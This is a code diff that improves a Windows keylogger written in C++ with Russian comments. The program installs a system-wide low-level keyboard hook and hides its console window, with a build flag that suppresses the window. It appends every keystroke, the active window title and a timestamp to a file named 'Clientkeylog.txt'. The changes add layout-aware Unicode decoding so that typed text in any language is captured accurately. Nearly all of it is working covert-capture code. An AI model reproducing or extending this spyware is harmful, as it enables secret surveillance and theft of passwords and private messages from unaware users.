@@ -2,7 +2,7 @@
 #include <time.h>
 #include <iostream>
 #include <fstream>
-
+//g++ main.cpp -static -o program.exe -mwindows
 using namespace std;
 
 //Cохранение в файл 
@@ -46,11 +46,11 @@ KBDLLHOOKSTRUCT kbStruct;
 ofstream file;
 
 
-extern char prevProg[256];
+//extern char prevProg[256];
 
 int Save(int key){
     //Массив для хранения имени открытого окна 
-    //char prevProg[256];
+    static char prevProg[256] = {0};
 
     //клавиши мыши
     if(key == 1 || key == 2){
@@ -74,7 +74,7 @@ int Save(int key){
 
         //Получаем имя окна
         char crrProg[256];
-        GetWindowText(foreground, crrProg, sizeof(crrProg));
+        GetWindowTextA(foreground, crrProg, sizeof(crrProg));
 
         if(strcmp(prevProg, crrProg) != 0){
             strcpy_s(prevProg, crrProg);     
@@ -87,7 +87,19 @@ int Save(int key){
 
             strftime(c, sizeof(c), "%c", tm);
 
-            file << "\n\n\n[Program: " << crrProg << " Date" << c << "]";
+            int len = MultiByteToWideChar(CP_ACP, 0, crrProg, -1, NULL, 0);
+            wchar_t* wstr = new wchar_t[len];
+            MultiByteToWideChar(CP_ACP, 0, crrProg, -1, wstr, len);
+        
+            // Преобразуем из wide char в UTF-8
+            int utf8_len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
+            char* utf8_str = new char[utf8_len];
+            WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, utf8_len, NULL, NULL);
+
+            file << "\n\n\n[Program: " << utf8_str << " Date" << c << "]";
+
+            delete[] wstr;
+            delete[] utf8_str;
         }
 
     }
@@ -125,31 +137,84 @@ int Save(int key){
     else if(key == 189 || key == 109)
         file << "-";          
     else{
-        char crrKey;
+        wchar_t crrKey[2] = {0}; // Массив для символа
+        BYTE keyboardState[256]; // Состояние клавиатуры
+    
+        GetKeyboardState(keyboardState);
+    
+        // Преобразуем виртуальный код в символ с учетом раскладки
+        //1 – максимальное количество символов для записи (обычно 1).
+        //0 – флаг (если 0, обычная обработка).
+        int result = ToUnicodeEx(key, key, keyboardState, crrKey, 1, 0, keyboatdLayout);
+    
+        if (result > 0) {
+            char utf8_str[8] = {0}; 
 
-        //проверяем зажат ли капс
-        bool isLowerCaseMode = ((GetKeyState(VK_CAPITAL) && 0x0001) == 0);
-
-        //проверяем зажат ли шифт
-        if ((GetKeyState(VK_SHIFT) && 0x1000) == 1 ||
-            (GetKeyState(VK_LSHIFT) && 0x1000) == 1 ||
-            (GetKeyState(VK_RSHIFT) && 0x1000) == 1 ){
-                isLowerCaseMode = !isLowerCaseMode;
+            /*
+                CP_UTF8 – целевой формат (кодировка UTF-8).
+                0 – параметры (по умолчанию).
+                crrKey – входная строка (один символ).
+                -1 – длина входной строки (автоматически).
+                utf8_str – буфер для UTF-8 строки.
+                sizeof(utf8_str) – размер буфера (8 байт, достаточно для любого символа UTF-8).
+                NULL, NULL – дополнительные параметры (не используются).
+            */
+            int len = WideCharToMultiByte(CP_UTF8, 0, crrKey, -1, utf8_str, sizeof(utf8_str), NULL, NULL);
+    
+            if (len > 0) {
+                file << utf8_str; // Записываем символ
+            }
         }
-
-        //получить символ клавиши по её коду
-        crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboatdLayout);
-
-        if(isLowerCaseMode == 1){
-            crrKey = tolower(crrKey);
-        }
-        
-
-        file << char(crrKey);
     }
 
     file.flush();
 
     return 0;
 
+}
+
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam){
+    if (nCode >= 0){
+        //было ли нажатие кнопки
+        if(wParam == WM_KEYDOWN){
+            kbStruct = *(KBDLLHOOKSTRUCT*)lParam;
+
+            Save(kbStruct.vkCode);
+        }
+
+
+    }
+
+
+    return CallNextHookEx(hook, nCode, wParam, lParam);
+}
+
+int main(){
+    //ios_base::app это append
+    file.open("D:\\Clientkeylog.txt", ios_base::app | ios_base::binary);
+
+    if (file.tellp() == 0) {
+        file << "\xEF\xBB\xBF"; // UTF-8 BOM
+    }
+    
+    //1 - консоль видна, 0 - консоль не видна
+    //NULL - заголовок файла не учитывается при поиске
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);
+
+
+    /*
+    NULL - дескриптор модуля (NULL для текущего процесса)
+    0 - идентификатор потока (0 для хука на все потоки)
+    */
+    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))){
+        MessageBoxA(NULL, "Someting has gone wrong!", "Error", MB_ICONERROR);
+    }
+
+    MSG message;
+
+    while(GetMessage(&message, NULL, 0, 0)){
+        //NULL — получать сообщения для всех окон потока
+
+        //0, 0 — без фильтрации по типам сообщений
+    }
 }
